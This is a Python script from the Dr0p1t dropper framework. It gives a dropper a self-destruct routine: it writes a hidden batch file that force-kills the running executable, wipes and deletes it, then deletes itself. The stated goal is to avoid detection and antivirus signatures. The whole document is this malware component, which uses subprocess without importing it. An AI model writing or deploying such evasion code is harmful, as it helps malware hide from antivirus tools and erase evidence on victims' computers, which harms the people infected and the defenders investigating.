#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to add the ability of the self-remove and kill to the dropper to avoid detection and possible av signtures
#Start

from sys import executable
def selfdestruct():
	filename = executable.split("\\")[-1]
	data = '''@echo off
TASKKILL /F /IM "{0}"
break>{0}
DEL -f "{0}"
break>"%~f0" && DEL "%~f0"
echo Good but not good enough >> {0}'''.format( filename )
	f = open("Thanks_For_Using_Our_Service.bat","w") #Looool :XD
	f.write(data)
	f.close()
	xxx = subprocess.Popen("Thanks_For_Using_Our_Service.bat >> NUL",shell=True)

selfdestruct()
